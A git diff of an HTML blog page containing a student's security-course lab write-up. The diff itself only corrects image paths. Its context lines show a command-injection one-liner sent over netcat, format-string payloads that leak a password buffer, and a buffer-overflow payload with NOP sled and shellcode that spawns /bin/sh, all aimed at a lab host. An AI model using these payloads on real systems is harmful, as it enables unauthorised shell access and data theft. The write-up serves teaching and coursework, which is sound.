@@ -34,7 +34,7 @@
 <meta property="og:description" content="This report is related to FIT5003 2020S2 Assignment 1. The main aspects that this assignment reviews are Buffer Overflow, Format String Vulnerability, and Android &amp; Java Security.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/1.jpg">
-<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/2.jpg">
+<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/FIT5003/FIT5003%20Assignment%201/2.jpg">
 <meta property="og:image" content="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/3.jpg">
 <meta property="og:image" content="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/4.jpg">
 <meta property="og:image" content="https://rdweirdo981.github.io/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/5.jpg">
@@ -357,7 +357,7 @@ execute for all files in the folder</p>
 <p>Command injection:</p>
 <figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"hackthebox.com; chmod a=rwx ~/hidden"</span> | nc 10.0.2.14 7070</span><br></pre></td></tr></tbody></table></figure>
 <p>Result:</p>
-<p><img src="1.jpg"></p>
+<p><img src="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/1.jpg"></p>
 <h2 id="c-fixing-the-vulnerability">c) Fixing the vulnerability</h2>
 <p>Reference:</p>
 <p>https://owasp.org/www-community/attacks/Command_Injection</p>
@@ -385,9 +385,9 @@ username will accept <code>myprintf()</code>. We use FSV in
 <code>myprintf()</code>.</p>
 <p>This requires lots of attempts, but finally we got:</p>
 <figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(perl -e 'print "%.8x."x7, "%s"') pw123 | nc 10.0.2.14 6063 </span><br></pre></td></tr></tbody></table></figure>
-<p><img src="Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/2.jpg"></p>
+<p><img src="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/FIT5003/FIT5003%20Assignment%201/2.jpg"></p>
 <figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(perl -e 'print "%.8x."x8, "%s"') pw123 | nc 10.0.2.14 6063 </span><br></pre></td></tr></tbody></table></figure>
-<p><img src="3.jpg"></p>
+<p><img src="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/3.jpg"></p>
 <p>The password_buffer address is at 8th position.</p>
 <p>We do not need 0xbfffc80 because this address will change when we
 change password.</p>
@@ -400,7 +400,7 @@ buffer size then is 119.</p>
 <h3 id="step-3">Step 3</h3>
 <p>BOF the shellcode</p>
 <figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(perl -e 'print "%.8x."x8') $(perl -e 'print "A"x119')| nc 10.0.2.14 6063 </span><br></pre></td></tr></tbody></table></figure>
-<p><img src="4.jpg"></p>
+<p><img src="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/4.jpg"></p>
 <p>The last buffer address is 0xbfffc10. We now can use this to do BOF
 attack.</p>
 <p>Ref: What’s a reverse shell
@@ -409,7 +409,7 @@ https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-l
 reverse shell in our tutorial, I found that the shellcode does useful.
 So, I use it to obtain the reverse shell.</p>
 <figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> $(perl -e <span class="string">'print "%.8x."x8'</span>) $(perl -e <span class="string">'print "\x90"x40,"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80\x90","\x19\xfc\xff\xbf"x15'</span>)| nc 10.0.2.14 6063</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="5.jpg"></p>
+<p><img src="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/5.jpg"></p>
 <h2 id="b-getting-the-file">b) Getting the file</h2>
 <p>Ref:
 https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</p>
